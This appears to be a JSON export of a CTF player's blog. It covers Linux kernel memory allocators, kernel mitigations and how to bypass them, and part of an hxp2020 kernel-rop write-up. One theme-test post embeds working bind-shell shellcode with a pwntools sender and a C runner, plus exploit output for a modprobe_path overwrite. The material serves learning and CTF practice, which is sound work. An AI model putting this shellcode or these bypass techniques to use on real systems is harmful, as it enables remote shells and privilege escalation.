[{"categories":["kernel"],"content":"CTF games have flourished in recent years. However, more GLIBC heap allocator exploit techiniques are becoming boring and meaningless, especially for games in China. Challenges are well-designed, deliberately constructed, leading to specific ways to solve them, which is actually further and further away from real world exploits. I started to aim more at Linux kernel memory allocator these days and gathered some imformation about Buddy System \u0026 SLUB hitherto. ","date":"2021-08-27","objectID":"/2021/08/slab_buddy_system0/:0:0","tags":null,"title":"SLUB \u0026 Buddy System in Linux Kernel","uri":"/2021/08/slab_buddy_system0/"},{"categories":["kernel"],"content":"Buddy System Buddy allocation system is an algorithm in which a larger memory block is divided into small parts to satisfy the request. This algorithm is used to give best fit[1]. There are couple of types of Buddy allocation system Binary buddy system Fibonacci buddy system Weighted buddy system Tertiary buddy system In Binary buddy system, memory is allocated and freed in PAGE_SIZE (e.g. 4K) using order to indicate size of chunks. Typically we have SIZE [of chunks of order=n] = 2^n * PAGE_SIZE We note an example from wiki[2]. Suppose minimum size of chunk is 64K and maximum order of chunk is 4, and user tries to allocate memory of 34K. This allocation could have occurred in the following manner The initial situation. Program A requests memory 34 K, order 0. No order 0 blocks are available, so an order 4 block is split, creating two order 3 blocks. Still no order 0 blocks available, so the first order 3 block is split, creating two order 2 blocks. Still no order 0 blocks available, so the first order 2 block is split, creating two order 1 blocks. Still no order 0 blocks available, so the first order 1 block is split, creating two order 0 blocks. Now an order 0 block is available, so it is allocated to A. Program B requests memory 66 K, order 1. An order 1 block is available, so it is allocated to B. Program C requests memory 35 K, order 0. An order 0 block is available, so it is allocated to C. Program D requests memory 67 K, order 1. No order 1 blocks are available, so an order 2 block is split, creating two order 1 blocks. Now an order 1 block is available, so it is allocated to D. Program B releases its memory, freeing one order 1 block. Program D releases its memory. One order 1 block is freed. Since the buddy block of the newly freed block is also free, the two are merged into one order 2 block. Program A releases its memory, freeing one order 0 block. Program C releases its memory. One order 0 block is freed. Since the buddy block of the newly freed block is also free, the two are merged into one order 1 block. Since the buddy block of the newly formed order 1 block is also free, the two are merged into one order 2 block. Since the buddy block of the newly formed order 2 block is also free, the two are merged into one order 3 block. Since the buddy block of the newly formed order 3 block is also free, the two are merged into one order 4 block. As you can see, what happens when a memory request is made is as follows: If memory is to be allocated Look for a memory slot of a suitable size (the minimal 2k block that is larger or equal to that of the requested memory) If it is found, it is allocated to the program If not, it tries to make a suitable memory slot. The system does so by trying the following: Split a free memory slot larger than the requested memory size into half If the lower limit is reached, then allocate that amount of memory Go back to step 1 (look for a memory slot of a suitable size) Repeat this process until a suitable memory slot is found If memory is to be freed Free the block of memory Look at the neighboring block – is it free too? If it is, combine the two, and go back to step 2 and repeat this process until either the upper limit is reached (all memory is freed), or until a non-free neighbour block is encountered Linux complements buddy system mainly by get_free_pages() and alloc_pages(). Memory allocated is continuous and return address of memory can be converted to physical address using const virts_to_phys() use /proc/buddyinfo and /proc/pagetypeinfo on your computer. x1do0@x1do0:~/kernel_learning/khop$ sudo cat /proc/pagetypeinfo Page block order: 9 Pages per block: 512 Free pages count per migrate type at order 0 1 2 3 4 5 6 7 8 9 1 Node 0, zone DMA, type Unmovable 0 0 0 1 1 1 1 0 1 0 Node 0, zone DMA, type Movable 0 0 0 0 0 0 0 0 0 1 Node 0, zone DMA, type Reclaimable 1 1 0 2 2 1 0 1 1 1 Node 0, zone DMA, type HighAtomic 0 0 0 0 0 0 0 0 0 0 Node 0, zone DMA, type CMA 0 0 0 0 0 0 0 0 0 0 Node ","date":"2021-08-27","objectID":"/2021/08/slab_buddy_system0/:1:0","tags":null,"title":"SLUB \u0026 Buddy System in Linux Kernel","uri":"/2021/08/slab_buddy_system0/"},{"categories":["kernel"],"content":"SLUB ","date":"2021-08-27","objectID":"/2021/08/slab_buddy_system0/:2:0","tags":null,"title":"SLUB \u0026 Buddy System in Linux Kernel","uri":"/2021/08/slab_buddy_system0/"},{"categories":["kernel"],"content":"Bird’s eye view Most of the time, memory allocated by buddy system is too large for users. To go to a step further, slub allocator will continue to divide and allocate memory into pieces, just like heap chunks in GLIBC. Linux modified SLAB codes and come up with a more efficient mechanism, SLUB[3], intended for memory allocation of kernel objects. There are many structures in slub and I paste an execellent picture of framework here. A more brief version. kmem_cache is like main_arena in GLIBC, and every kmem_cache contains many slab, each of which is made up of one or more consecutive pages and there are many object of identical size in every pages, which are exposed to users. Type cat /proc/slabinfo to see more info on your computer. / # cat /proc/slabinfo slabinfo - version: 2.1 # name \u003cactive_objs\u003e \u003cnum_objs\u003e \u003cobjsize\u003e \u003cobjperslab\u003e \u003cpagesperslab\u003e : tunables \u003climit\u003e \u003cbatchcount\u003e \u003csharedfactor\u003e : slabdata \u003cactiv\u003e fsverity_info 0 0 248 16 1 : tunables 0 0 0 : slabdata 0 0 0 ip6-frags 0 0 184 22 1 : tunables 0 0 0 : slabdata 0 0 0 PINGv6 0 0 1280 12 4 : tunables 0 0 0 : slabdata 0 0 0 RAWv6 12 12 1280 12 4 : tunables 0 0 0 : slabdata 1 1 0 UDPv6 0 0 1408 11 4 : tunables 0 0 0 : slabdata 0 0 0 tw_sock_TCPv6 0 0 248 16 1 : tunables 0 0 0 : slabdata 0 0 0 request_sock_TCPv6 0 0 304 13 1 : tunables 0 0 0 : slabdata 0 0 0 TCPv6 0 0 2432 13 8 : tunables 0 0 0 : slabdata 0 0 0 kcopyd_job 0 0 3312 9 8 : tunables 0 0 0 : slabdata 0 0 0 dm_uevent 0 0 2632 12 8 : tunables 0 0 0 : slabdata 0 0 0 scsi_sense_cache 32 32 128 32 1 : tunables 0 0 0 : slabdata 1 1 0 mqueue_inode_cache 8 8 1024 8 2 : tunables 0 0 0 : slabdata 1 1 0 fuse_request 0 0 144 28 1 : tunables 0 0 0 : slabdata 0 0 0 fuse_inode 0 0 896 9 2 : tunables 0 0 0 : slabdata 0 0 0 ecryptfs_inode_cache 0 0 1024 8 2 : tunables 0 0 0 : slabdata 0 0 0 ecryptfs_file_cache 0 0 16 256 1 : tunables 0 0 0 : slabdata 0 0 0 ecryptfs_auth_tok_list_item 0 0 896 9 2 : tunables 0 0 0 : slabdata 0 0 0 fat_inode_cache 0 0 744 11 2 : tunables 0 0 0 : slabdata 0 0 0 fat_cache 0 0 40 102 1 : tunables 0 0 0 : slabdata 0 0 0 squashfs_inode_cache 0 0 768 10 2 : tunables 0 0 0 : slabdata 0 0 0 jbd2_journal_handle 0 0 48 85 1 : tunables 0 0 0 : slabdata 0 0 0 jbd2_journal_head 0 0 120 34 1 : tunables 0 0 0 : slabdata 0 0 0 jbd2_revoke_table_s 0 0 16 256 1 : tunables 0 0 0 : slabdata 0 0 0 ext4_inode_cache 0 0 1096 29 8 : tunables 0 0 0 : slabdata 0 0 0 ext4_allocation_context 0 0 128 32 1 : tunables 0 0 0 : slabdata 0 0 0 ext4_system_zone 0 0 40 102 1 : tunables 0 0 0 : slabdata 0 0 0 ext4_io_end 0 0 64 64 1 : tunables 0 0 0 : slabdata 0 0 0 ext4_pending_reservation 0 0 32 128 1 : tunables 0 0 0 : slabdata 0 0 0 ext4_extent_status 0 0 40 102 1 : tunables 0 0 0 : slabdata 0 0 0 mbcache 0 0 56 73 1 : tunables 0 0 0 : slabdata 0 0 0 userfaultfd_ctx_cache 0 0 256 16 1 : tunables 0 0 0 : slabdata 0 0 0 dnotify_struct 0 0 32 128 1 : tunables 0 0 0 : slabdata 0 0 0 pid_namespace 0 0 208 19 1 : tunables 0 0 0 : slabdata 0 0 0 ip4-frags 0 0 200 20 1 : tunables 0 0 0 : slabdata 0 0 0 xfrm_dst_cache 0 0 384 10 1 : tunables 0 0 0 : slabdata 0 0 0 xfrm_state 0 0 768 10 2 : tunables 0 0 0 : slabdata 0 0 0 PING 8 8 1024 8 2 : tunables 0 0 0 : slabdata 1 1 0 RAW 8 8 1024 8 2 : tunables 0 0 0 : slabdata 1 1 0 tw_sock_TCP 0 0 248 16 1 : tunables 0 0 0 : slabdata 0 0 0 request_sock_TCP 0 0 304 13 1 : tunables 0 0 0 : slabdata 0 0 0 TCP 0 0 2304 14 8 : tunables 0 0 0 : slabdata 0 0 0 hugetlbfs_inode_cache 25 25 632 25 4 : tunables 0 0 0 : slabdata 1 1 0 dquot 0 0 256 16 1 : tunables 0 0 0 : slabdata 0 0 0 eventpoll_pwq 0 0 72 56 1 : tunables 0 0 0 : slabdata 0 0 0 dax_cache 10 10 768 10 2 : tunables 0 0 0 : slabdata 1 1 0 request_queue 15 15 2104 15 8 : tunables 0 0 0 : slabdata 1 1 0 biovec-max 32 32 4096 8 8 : tunables 0 0 0 : slabdata 4 4 0 biovec-128 8 8 2048 8 4 : tunables 0 0 0 : slabdata 1 1 0 biovec-64 8 8 1024 8 2 : tunables 0 0 0 : slabdata 1 1 0 khugepaged_mm_slot 0 0 112 36 1 : tunables 0 0 0 : slabdata 0 0 0 use","date":"2021-08-27","objectID":"/2021/08/slab_buddy_system0/:2:1","tags":null,"title":"SLUB \u0026 Buddy System in Linux Kernel","uri":"/2021/08/slab_buddy_system0/"},{"categories":["kernel"],"content":"APIs There are some important APIs for users. create a kmem_cache with specific size and name. struct kmem_cache * kmem_cache_create ( const char *name, size_t size, size_t align, unsigned long flags, void (*ctor(void*, struct kmem_cache *, unsigned long), void (*dtor(void*, struct kmem_cache *, unsigned long)); create a object in specific kmem_cache void * kmem_cache_alloc (struct kmem_cache * cachep, gfp_t flags); free a specific object in specific kmem_cache void kmem_cache_free (struct kmem_cache * cachep, void * objp); allocate a object in kmalloc-***. Kernel will find a best matched kmem_cache, and if sizes required are more than the biggest size of them (8K), buddy system will help to allocator the memory directly. void * kmalloc (size_t size, gfp_t flags); free a object. Kernel will find the page of the object, read out pointer of the object and copy to a freelist, with fd pointer points to next freed object, same as tcache in GLIBC. void kfree (const void * objp); ","date":"2021-08-27","objectID":"/2021/08/slab_buddy_system0/:2:2","tags":null,"title":"SLUB \u0026 Buddy System in Linux Kernel","uri":"/2021/08/slab_buddy_system0/"},{"categories":["kernel"],"content":"Details Let’s go deep into kmalloc-***. As you can see, the smallest is kmalloc-8 and the largest is kmalloc-8k with size of 2^3 to 2^13 bytes. In older kernel version, max size is 2^11 bytes. Details are in the following picture. kmem_cache_cpu is like a supermarket freelist is the header of freed object lists page is the header of allocated object lists And kmem_cache_node is the depository. partial points to partially allocated slub lists. full points to fully allocated slub lists. We will go through it step by step together. Allocating process kmem_cache_node and kmem_cache_cpu contain no slub. After an allocation request, buddy system allocates a large chunk of memory, divides it into pieces, returns one piece to users. Now kmem_cache_cpu has a slub ready to use with freelist and page point to correct places. Users continue to require allocation After slab of kmem_cache_cpu is filled with objects, the next allocation will trigger a swtich, putting the previous full slab into the full lists of kmem_cache_node and one not full slab from partial lists to kmem_cache_cpu, and then return a object to users. And finally, all slabs are full. Buddy system stands out again and gives us a brand new empty slab. Now you may want to ask, how can a slab be added into partial lists? Well, follow me with the process of freeing these objects. Freeing process Depending on where the object to be free is, there are some kinds of situation. In kmem_cache_cpu, Kernel will put it from page list to freelist list. In not full slab of partial list in kmem_cache_node, mark the object freed. In full slab of full list, free it and put the slab into partial list. What’s more, if a slub is entirely empty, the whole slab will be freed. ","date":"2021-08-27","objectID":"/2021/08/slab_buddy_system0/:2:3","tags":null,"title":"SLUB \u0026 Buddy System in Linux Kernel","uri":"/2021/08/slab_buddy_system0/"},{"categories":["kernel"],"content":"exploits If there is a use-after-free slab vulnerability in kernel mode, modifying fd to attack mprobe_path may be an easy way to exploit. If there is an overflow vulnerability in slab structure, the first thing is to allocate lots of objects to make later objects we allocate continuous. By overwriting the content of next ojbect, we can achieve our goal. For example, use fork to arrange cred structure of child process to the nexe object and zero it out by overflowing the previous object. In [5], author uses shmid_kernel structure to get root privilege. Ref [1] https://www.geeksforgeeks.org/operating-system-allocating-kernel-memory-buddy-system-slab-system/ [2] https://en.wikipedia.org/wiki/Buddy_memory_allocation [3] https://en.wikipedia.org/wiki/SLUB_(software) [4] https://blog.csdn.net/lukuen/article/details/6935068 [5] https://www.cnblogs.com/bittorrent/p/3266308.html ","date":"2021-08-27","objectID":"/2021/08/slab_buddy_system0/:2:4","tags":null,"title":"SLUB \u0026 Buddy System in Linux Kernel","uri":"/2021/08/slab_buddy_system0/"},{"categories":["kernel"],"content":"Like user mode, there are also couples of ways of mitigation against exploits in Linux kernel. Here is a list of mitigation in kernel mode and methods to bypass some of them. ","date":"2021-08-25","objectID":"/2021/08/kernel_mitigation_bypass/:0:0","tags":null,"title":"Linux Kernel Mitigation \u0026 Bypass","uri":"/2021/08/kernel_mitigation_bypass/"},{"categories":["kernel"],"content":"0x00 CANARY Same as user mode, lying at rbp-8 (or ebp-4 in 32 bits machine) ","date":"2021-08-25","objectID":"/2021/08/kernel_mitigation_bypass/:1:0","tags":null,"title":"Linux Kernel Mitigation \u0026 Bypass","uri":"/2021/08/kernel_mitigation_bypass/"},{"categories":["kernel"],"content":"0x01 KASLR Same as ASLR in user mode, adding random and varied PAGE SIZE to kernel and module loading address when booted. ","date":"2021-08-25","objectID":"/2021/08/kernel_mitigation_bypass/:2:0","tags":null,"title":"Linux Kernel Mitigation \u0026 Bypass","uri":"/2021/08/kernel_mitigation_bypass/"},{"categories":["kernel"],"content":"0x02 FG_KASLR Quite new techniques patched to strengthen KASLR, provides an address randomization at Function Granular rather than module granular at KASLR, which means even offset of the function would vary from time to time. Two way to bypass it Kernel symbols are not affected by FG_KASLR, so we can compute the actual address of functions. e.g. Address of commit_creds = Address of ksymtab_commit_creds + value_offset of it struct kernel_symbol { int value_offset; int name_offset; int namespace_offset; }; modprobe_path and swapgs_restore_regs_and_return_to_usermode are unaffected by FG_KASLR More details about exploits using modprobe_path were mentioned in the previous article [1] and [2] ","date":"2021-08-25","objectID":"/2021/08/kernel_mitigation_bypass/:3:0","tags":null,"title":"Linux Kernel Mitigation \u0026 Bypass","uri":"/2021/08/kernel_mitigation_bypass/"},{"categories":["kernel"],"content":"0x03 SMEP User mode codes are not permmited to execute in kernel mode (ring 0). Typically Return-to-user will no longer work out because of it. But we can still find gadgets to do Return-Oriented-Programming in kernel mode. ","date":"2021-08-25","objectID":"/2021/08/kernel_mitigation_bypass/:4:0","tags":null,"title":"Linux Kernel Mitigation \u0026 Bypass","uri":"/2021/08/kernel_mitigation_bypass/"},{"categories":["kernel"],"content":"0x04 SMAP User mode data should be unaccessible in kernel mode. x1do0@x1do0:~$ cat /proc/cpuinfo | grep smep | grep smap flags : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good nopl tsc_reliable nonstop_tsc cpuid extd_apicid pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw topoext ssbd ibpb vmmcall fsgsbase bmi1 avx2 smep bmi2 erms invpcid rdseed adx smap clflushopt clwb sha_ni xsaveopt xsavec xgetbv1 xsaves clzero wbnoinvd arat umip pku ospke vaes vpclmulqdq rdpid overflow_recov succor Along with SMEP, there are several ways to bypass them Use kernel gadgets to do ROP tamper CR4 register. By zero out high bits of CR4, we can disable kernel SMEP and SMAP mitigation. ret-to-direct-mapped memory (short as ret2dir). Ideas come from [3]. Memory users maped will be identically copied into physmap, see [4] for more about ram layout. So when SMAP and SMEP are enabled, we can actually jump to our codes in physmap to execute user mode codes. More details are in the original thesis and [5]. overwrite vdso (Virtual Dynamic Shared Object). vDSO is a chunk of memory used for making glibc and kernel compatible[6]. Typically, vDSO is r/w in kernel mode and r/x in user mode. So if we can modify vDSO to our shellcode in kernel mode and trigger codes in vDSO in user mode (basically gettimeofday() will automatically do this), we can execute codes in root privilege. If vDSO is not permitted to write, we can use set_memory_rw() to set area authority flag. More details in [7] and [8]. ","date":"2021-08-25","objectID":"/2021/08/kernel_mitigation_bypass/:5:0","tags":null,"title":"Linux Kernel Mitigation \u0026 Bypass","uri":"/2021/08/kernel_mitigation_bypass/"},{"categories":["kernel"],"content":"0x05 mmap_min_addr mmap_min_addr is a system value set to constrain the minimum address users can mmap to. This restriction prevents kernel from null pointer dereferences. x1do0@x1do0:~$ cat /proc/sys/vm/mmap_min_addr 65536 ","date":"2021-08-25","objectID":"/2021/08/kernel_mitigation_bypass/:6:0","tags":null,"title":"Linux Kernel Mitigation \u0026 Bypass","uri":"/2021/08/kernel_mitigation_bypass/"},{"categories":["kernel"],"content":"0x06 KPTI Used to separate user page table and kernel page table, which means not only cs, ss regiseters should be set properly when return to user mode from ring 0, but also gs register. swapgs should be executed before iret. *RAX 0x1001 *RBX 0x1614000 ◂— 0 *RCX 0x1614000 ◂— 0 *RDX 0x1615000 *RDI 0x705820 ◂— 0 *RSI 0x1615000 *R8 0x0 *R9 0x0 *R10 0x0 *R11 0x297 *R12 0x1613ff0 ◂— 0x540 *R13 0x1 R14 0x0 *R15 0x1 *RBP 0x1614000 ◂— 0 *RSP 0xfffffe0000002fd8 —▸ 0x400eea ◂— mov qword ptr [rdx - 0x10], rax *RIP 0xffffffff81c00aaf ◂— swapgs ────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────── ► 0xffffffff81c00aaf swapgs 0xffffffff81c00ab2 nop dword ptr [rax] 0xffffffff81c00ab5 jmp 0xffffffff81c00ae0 \u003c0xffffffff81c00ae0\u003e ↓ 0xffffffff81c00ae0 test byte ptr [rsp + 0x20], 4 0xffffffff81c00ae5 jne 0xffffffff81c00ae9 \u003c0xffffffff81c00ae9\u003e 0xffffffff81c00ae7 iretq 0xffffffff81c00ae9 push rdi 0xffffffff81c00aea swapgs 0xffffffff81c00aed nop dword ptr [rax] 0xffffffff81c00af0 nop 0xffffffff81c00af2 mov rdi, cr3 ────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────── 00:0000│ rsp 0xfffffe0000002fd8 —▸ 0x400eea ◂— mov qword ptr [rdx - 0x10], rax 01:0008│ 0xfffffe0000002fe0 ◂— 0x33 /* '3' */ 02:0010│ 0xfffffe0000002fe8 ◂— 0x202 03:0018│ 0xfffffe0000002ff0 —▸ 0x7fffd2abf100 ◂— 0x20 /* ' ' */ 04:0020│ 0xfffffe0000002ff8 ◂— 0x2b /* '+' */ 05:0028│ 0xfffffe0000003000 ◂— add byte ptr [rax], al 06:0030│ 0xfffffe0000003008 ◂— add dh, bh 07:0038│ 0xfffffe0000003010 ◂— add cl, cl ──────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────── ► f 0 0xffffffff81c00aaf f 1 0x400eea f 2 0x33 f 3 0x202 f 4 0x7fffd2abf100 f 5 0x2b f 6 0x300000000000 f 7 0x1ac000fffffe00 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── pwndbg\u003e info registers rax 0x1001 4097 rbx 0x1614000 23150592 rcx 0x1614000 23150592 rdx 0x1615000 23154688 rsi 0x1615000 23154688 rdi 0x705820 7362592 rbp 0x1614000 0x1614000 rsp 0xfffffe0000002fd8 0xfffffe0000002fd8 r8 0x0 0 r9 0x0 0 r10 0x0 0 r11 0x297 663 r12 0x1613ff0 23150576 r13 0x1 1 r14 0x0 0 r15 0x1 1 rip 0xffffffff81c00aaf 0xffffffff81c00aaf eflags 0x6 [ IOPL=0 PF ] cs 0x10 16 ss 0x0 0 ds 0x0 0 es 0x0 0 fs 0x0 0 gs 0x0 0 fs_base 0x705418 7361560 gs_base 0xffff88801f000000 -131391119425536 k_gs_base 0x0 0 you can see that this instruction simply does xchg gs_base, k_gs_base. After swapgs, page locations are switched between user mode and kernel mode. RAX 0x1001 RBX 0x1614000 ◂— 0 RCX 0x1614000 ◂— 0 RDX 0x1615000 RDI 0x705820 ◂— 0 RSI 0x1615000 R8 0x0 R9 0x0 R10 0x0 R11 0x297 R12 0x1613ff0 ◂— 0x540 R13 0x1 R14 0x0 R15 0x1 RBP 0x1614000 ◂— 0 RSP 0xfffffe0000002fd8 —▸ 0x400eea ◂— mov qword ptr [rdx - 0x10], rax *RIP 0xffffffff81c00ab2 ◂— nop dword ptr [rax] ────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────── 0xffffffff81c00aaf swapgs ► 0xffffffff81c00ab2 nop dword ptr [rax] 0xffffffff81c00ab5 jmp 0xffffffff81c00ae0 \u003c0xffffffff81c00ae0\u003e ↓ 0xffffffff81c00ae0 test byte ptr [rsp + 0x20], 4 0xffffffff81c00ae5 jne 0xffffffff81c00ae9 \u003c0xffffffff81c00ae9\u003e 0xffffffff81c00ae7 iretq 0xffffffff81c00ae9 push rdi 0xffffffff81c00aea swapgs 0xffffffff81c00aed nop dword ptr [rax] 0xffffffff81c00af0 nop 0xffffffff81c00af2 mov rdi, cr3 ────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────── 00:0000│ rsp 0xfffffe0000002fd8 —▸ 0x400eea ◂— mov qword ptr [rdx - 0x10], rax 01:0008│ 0xfffffe0000002fe0 ◂— 0x33 /* '3' */ 02:0010│ 0xfffffe0000002fe8 ◂— 0x202 03:0018│ 0xfffffe0000002ff0 —▸ 0x7fffd2abf100 ◂— 0x20 /* ' ' */ 04:00","date":"2021-08-25","objectID":"/2021/08/kernel_mitigation_bypass/:7:0","tags":null,"title":"Linux Kernel Mitigation \u0026 Bypass","uri":"/2021/08/kernel_mitigation_bypass/"},{"categories":["Pause-and-Ponder"],"content":"Refreshed by X1do0 prelude of the new theme demo babble ","date":"2021-08-25","objectID":"/2021/08/first_post/:0:0","tags":null,"title":"Init New World","uri":"/2021/08/first_post/"},{"categories":["Pause-and-Ponder"],"content":"Loop free Cuz it’s hard for me, I will find only time will tell I will figure out. ","date":"2021-08-25","objectID":"/2021/08/first_post/:1:0","tags":null,"title":"Init New World","uri":"/2021/08/first_post/"},{"categories":["Pause-and-Ponder"],"content":"lbwnb waf waf ","date":"2021-08-25","objectID":"/2021/08/first_post/:1:1","tags":null,"title":"Init New World","uri":"/2021/08/first_post/"},{"categories":["Pause-and-Ponder"],"content":"「lbwnb」 gang gang ","date":"2021-08-25","objectID":"/2021/08/first_post/:1:2","tags":null,"title":"Init New World","uri":"/2021/08/first_post/"},{"categories":["Pause-and-Ponder"],"content":"aka asdknas from pwn import * sc= b\"\\x31\\xc0\\x31\\xdb\\xb0\\x66\\xb3\\x01\\x31\\xd2\\x52\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc6\\xb0\\x66\\xb3\\x02\\x52\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x04\\x52\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x05\\x52\\x56\\x89\\xe1\\xcd\\x80\\x89\\xc6\\x31\\xc9\\xb0\\x3f\\x89\\xf3\\xcd\\x80\\xfe\\xc1\\x66\\x83\\xf9\\x02\\x7e\\xf2\\x31\\xc0\\x50\\xb0\\x0b\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xcd\\x80\"; io = remote(\"rookie_s**t\", 123) io.sendline(sc) io.interactive() #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e unsigned char shellcode[] = \\ \"\\x31\\xc0\\x31\\xdb\\xb0\\x66\\xb3\\x01\\x31\\xd2\\x52\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc6\\xb0\\x66\\xb3\\x02\\x52\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x04\\x52\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x05\\x52\\x56\\x89\\xe1\\xcd\\x80\\x89\\xc6\\x31\\xc9\\xb0\\x3f\\x89\\xf3\\xcd\\x80\\xfe\\xc1\\x66\\x83\\xf9\\x02\\x7e\\xf2\\x31\\xc0\\x50\\xb0\\x0b\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xcd\\x80\"; void main(int argc, char *argv[]) { /* Default port at 28th and 29th byte index: \\x11\\x5c */ // in case no port is provided the default would be used if (argc \u003c 2) { printf(\"No port provided, 4444 (0x115c will be used)\\n\"); } else { int port = atoi(argv[1]); printf(\"Binding to %d (0x%x)\\n\", port, port); unsigned int p1 = (port \u003e\u003e 8) \u0026 0xff; unsigned int p2 = port \u0026 0xff; // printf(\"%x %x\\n\", p1, p2); shellcode[28] = (unsigned char){p1}; shellcode[29] = (unsigned char){p2}; // printf(\"%x %x\", shellcode[28], shellcode[29]); } int (*ret)() = (int(*)())shellcode; ret(); } / $ /exp [+] open ko, return 3 [*] try to read from kernel, return 320 [*] kernel base is ffffffff95200000 [*] Reg saved cs = 33, ss = 2b, flags = 206, user_sp = 7ffce5505978 [*] Prepared payload to overwrite modprobe_path [*] Returned to userland, setting up for fake modprobe [*] Run unknown file /tmp/dummy: line 1: ����: not found [*] Hopefully flag is readable flag{TEST} ","date":"2021-08-25","objectID":"/2021/08/first_post/:2:0","tags":null,"title":"Init New World","uri":"/2021/08/first_post/"},{"categories":["Pause-and-Ponder"],"content":"kak Note\r\r一个 注意 横幅\r\r Abstract\r\r一个 摘要 横幅\r\r Info\r\r一个 信息 横幅\r\r Tip\r\r一个 技巧 横幅\r\r Success\r\r一个 成功 横幅\r\r Question\r\r一个 问题 横幅\r\r Warning\r\r一个 警告 横幅\r\r Failure\r\r一个 失败 横幅\r\r Danger\r\r一个 危险 横幅\r\r Bug\r\r一个 Bug 横幅\r\r Example\r\r一个 示例 横幅\r\r Quote\r\r一个 引用 横幅\r\r ","date":"2021-08-25","objectID":"/2021/08/first_post/:3:0","tags":null,"title":"Init New World","uri":"/2021/08/first_post/"},{"categories":["Pause-and-Ponder"],"content":"中文测试 别吵别吵别吵，你可能以为我在第一层，实际上我是1145141919810欧洗给欧洗给haoduoyinliugou好想做嘉然小姐的狗歪比巴卜两面包夹芝士看我一个空中劈叉飞龙骑脸怎么输A1高闪来一个秋梨膏异世相遇尽享美味777777若风一指若风一指吼吼吼全给党为你打calllllll李吼那么大声干甚么今生立誓以你为王吾王剑锋所指是我永恒不变的信仰欧拉欧拉木大木大你们有为roselia赌上一切的觉悟吗这一刻我充满了决心小朋友们大家好我是你们的好朋友金坷垃肥料资源不缺乏必须要有faq此生无悔入东方，来世愿为蓝蓝路先有老菊后有天太阳骑士日神仙哈喽大家好欢迎来到籽岷的minecraft游戏世界我从未见过如此厚颜无耻之人乌鸦坐飞机什么是快乐星球贵州和广西相比大家好，我叫张全蛋，我的英文名叫挖掘机技术哪家强，山东技校找烤面筋香香的滴口味你尝过没不如去问问神奇海螺吧欧巴刚弄死他我不是针对你我是说在座的所有人我卢本伟没有开挂基尼太美，林北66CCFF如果我有十点法力水晶我能在河边钓上一整天的杰哥不要awsl来房里有好康的可以教你蓝瘦香菇给力嗷铁子奥利给老铁双击666我爸是李刚两面包夹芝士我的头发乌黑浓乌鱼子乌鱼子乌鱼子乌鱼子绝绝子绝绝子绝绝子绝绝子这位更是重量级 ","date":"2021-08-25","objectID":"/2021/08/first_post/:4:0","tags":null,"title":"Init New World","uri":"/2021/08/first_post/"},{"categories":["Pause-and-Ponder"],"content":"友链测试 Thanks for your splendid theme, I mainly edited on this. \rDillon\rAuthor of the theme\r\r\r\rAlso, Banerya does make a difference by helping me debug my codes from remote devices during my blog migration. I have encontered some confusing problems about tty and woff on my website, which now turns out that my system configuration is to blame. Thanks for your patience, it really helps me a lot. \rBanerya\rHarbin Institute of Technology\r\r\r\rMore work needs to be done, currently I’m trying to move all of my blogs hitheto to here. So far so goooood… Warning\r\r施工中…\r\r","date":"2021-08-25","objectID":"/2021/08/first_post/:5:0","tags":null,"title":"Init New World","uri":"/2021/08/first_post/"},{"categories":["PWN"],"content":"Congratulations to Kaztebin, ranked 1 in DEFCON CTF29 again. It reminds me of my first ctf competition with Katzebin: hxp2020 [1]. There are some excellent challenges in this game which I missed out at that time, including some linux kernel exploitations. Recently I started to learn kernel pwn, and I think it’s time to solve these left challenges. ","date":"2021-08-23","objectID":"/2021/08/hxp2020/:0:0","tags":null,"title":"Hxp2020","uri":"/2021/08/hxp2020/"},{"categories":["PWN"],"content":"kernel-rop | 6 solved | 667 points The kernel insmod a bugged module “hackme”, which has open/read/write functions. In read function, It reads from kernel stack starting from tmp (rbp - 0x20h) with a size no more than 0x1000, and copy to user. However tmp is just 0x20 bytes long, which can cause some memory leaking on kernel stack. ssize_t __fastcall hackme_read(file *f, char *data, size_t size, loff_t *off) { unsigned __int64 v4; // rdx unsigned __int64 v5; // rbx bool v6; // zf ssize_t result; // rax int tmp[32]; // [rsp+0h] [rbp-A0h] BYREF unsigned __int64 v9; // [rsp+80h] [rbp-20h] _fentry__(f, data, size, off); v5 = v4; v9 = __readgsqword(0x28u); _memcpy(hackme_buf, tmp); if ( v5 \u003e 0x1000 ) { _warn_printk(\"Buffer overflow detected (%d \u003c %lu)!\\n\", 4096LL, v5); BUG(); } _check_object_size(hackme_buf, v5, 1LL); v6 = copy_to_user(data, hackme_buf, v5) == 0; result = -14LL; if ( v6 ) result = v5; return result; } Same in write function, we can copy really long buffer to the kernel stack, causing stack overflow in kernel space. ssize_t __fastcall hackme_write(file *f, const char *data, size_t size, loff_t *off) { unsigned __int64 v4; // rdx ssize_t v5; // rbx int tmp[32]; // [rsp+0h] [rbp-A0h] BYREF unsigned __int64 v8; // [rsp+80h] 